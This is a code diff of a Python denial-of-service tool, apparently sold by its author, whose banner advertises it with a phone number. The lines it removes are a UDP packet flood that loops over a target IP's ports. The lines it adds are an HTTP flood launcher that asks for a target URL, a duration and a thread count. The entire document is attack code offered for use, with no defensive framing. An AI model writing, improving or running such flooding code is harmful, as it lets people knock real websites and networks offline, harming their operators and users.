@@ -20,51 +20,76 @@ cyan='\033[96m'
 pink='\033[95m'
 red='\033[91m'
 b='\033[1m'
-###################################################################################
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-###################################################################################
-###################################################################################
-# IMPORT MODULE
-import os, sys, socket, threading, random
-###################################################################################
-# CLEAR
-def clear():
-	os.system('cls' if os.name=='nt' else 'clear')
-###################################################################################
+# Import modules
+import os
+import sys
+import argparse
+from colorama import Fore
 
-os.system("clear")
-os.system("apt-get install -y figlet")
-os.system("figlet DDos")
-print (" ")
-###################################################################################
-# MAIN MENU 
+os.system("@cls & @title Bui Quang Khai DDOS Tool by: BQK and Beta & @color e")
 
-ip = input("\033[94m╔═══\033[91m[ Please input IP ] •\n\033[94m╠══>\033[0m ")
+# Get the actual directory
+os.chdir(os.path.dirname(os.path.realpath(__file__)))
 
-port = str(input("\033[94m╠═══\033[91m[ Port enter 00000 ] •\n\033[94m╠══>\033[0m "))
+try:
+    from tools.crash import CriticalError
+    import tools.addons.clean
+    import tools.addons.logo
+    # import tools.addons.winpcap
+    import tools.addons.wireshark
+    from tools.method import AttackMethod
+except ImportError as err:
+    CriticalError("Failed to import some packages", err)
+    sys.exit(1)
 
-speed = int(input("\033[94m╠═══\033[91m[ Attack speed (0-1000) ] •\n\033[94m╠══>\033[0m "))
-clear()
-print("\033[93m")
-###################################################################################
+method = "HTTP"
+logo = """
+=====[BQK-DdoS]=====
+                                ,-.
+                               ( O_)
+                              / `-/
+                             /-. /
+                            /   )
+                           /   /
+              _           /-. /
+             (_)*-._     /   )
+               *-._ *-'**( )/
+My name is         *-/*-._* `.
+Bui Quang Khai      /     *-.'._
+i'm Tricker        /\       /-._*-._
+    _,---...__    /  ) _,-*/    *-(_)
+___<__(|) _   **-/  / /   /
+ '  `----' **-.   \/ /   /
+               )  ] /   /
+       ____..-'   //   /                       )
+   ,-**      __.,'/   /   ___                 /,
+  /    ,--**/  / /   /,-**   ***-.          ,'/
+ [    (    /  / /   /  ,.---,_   `._   _,-','
+  /    `-./  / /   /  /       `-._  *** ,-'
+   `-._  /  / /   /_,'            **--*
+       */  / /   /*
+       /  / /   /
+      /  / /   / ~~> Beta Version  <~~
+     /  |,'   /  ~~> 0352876128    <~~
+    :   /    /   ~~> Mua tool ib   <~~
+    [  /   ,'    ~~> BQK. X .DdoS  <~~
+    | /  ,'
+    |/,-'
+    ' 
+"""
+CRED2 = '\33[91m'
 
-sent = 0
-if port == "all":
-     port = 1
-     sent = 1     
-     while True:
-          sock.sendto(bytes, (ip,port))
-          port = port + 1
-          print ("Has sent %s packet %s port %d"%(sent,ip,port))
-          time.sleep((1000-speed)/2000)
-          if port == 65535:
-               port = 1
-               sent = sent + 1
+if __name__ == "__main__":
+    # Print help
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(CRED2 + logo + CRED2)
+    print("├───DDOS TOOL LAYER 7")
+    time = int(input(f"{Fore.RED}│   ├───TIME:{Fore.RESET}"))
+    threads = int(input(f"{Fore.RED}│   └───THREADS:{Fore.RESET}"))
+    target = str(input(f"{Fore.RED}│   └───URL:{Fore.RESET}"))
+    with AttackMethod(
+        duration=time, name=method, threads=threads, target=target
+    ) as Flood:
+        Flood.Start()
 else:
-     port = int(port)
-     while True:
-          sock.sendto(bytes, (ip,port))
-          sent = sent + 1
-          print ("Has sent %s packet %s port %d"%(sent,ip,port))
-          time.sleep((1000-speed)/2000)
+    sys.exit(1)
